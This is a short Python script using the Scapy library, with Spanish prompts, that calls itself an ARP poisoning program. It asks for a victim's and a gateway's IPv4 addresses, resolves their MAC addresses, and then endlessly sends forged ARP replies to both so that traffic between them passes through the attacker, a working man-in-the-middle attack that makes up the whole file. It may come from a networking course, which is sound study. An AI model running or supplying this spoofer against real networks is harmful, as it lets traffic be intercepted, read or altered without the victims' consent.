from scapy.all import ARP, Ether, ICMP, IP, sendp
from scapy.layers.l2 import getmacbyip


def arpSpoof(ipdes, mdes, ipo):
    arpPac = Ether(dst=mdes) / ARP(op=2, pdst=ipdes, hwdst=mdes, psrc=ipo)
    sendp(arpPac)


print("Esto es el programa de envenenamiento de ARP de PAR")
compr = False
while compr == False:
    ip_vic = input("Escriba la direccion IPv4 de destino: ")
    n = ip_vic.split(".")
    if len(n) == 4:
        for i in range(4):
            n[i] = int(n[i])
        if n[0] >= 0 and n[0] <= 255:
            if n[1] >= 0 and n[1] <= 255:
                if n[2] >= 0 and n[2] <= 255:
                    if n[3] >= 0 and n[3] <= 255:
                        compr = True
    else:
        print("La dirección IP debe de tener 4 bytes")
    if compr == True:
        mac_vic = getmacbyip(ip_vic)
compr = False
while compr == False:
    ip_gat = input("Escriba la direccion IPv4 de la puerta de enlace: ")
    n = ip_gat.split(".")
    if len(n) == 4:
        for i in range(4):
            n[i] = int(n[i])
        if n[0] >= 0 and n[0] <= 255:
            if n[1] >= 0 and n[1] <= 255:
                if n[2] >= 0 and n[2] <= 255:
                    if n[3] >= 0 and n[3] <= 255:
                        compr = True
    else:
        print("La dirección IP debe de tener 4 bytes")
    if compr == True:
        mac_gat = getmacbyip(ip_gat)

print("Enviando paquetes ARP...")
while True:
    arpSpoof(ip_vic, mac_vic, ip_gat)
    arpSpoof(ip_gat, mac_gat, ip_vic)
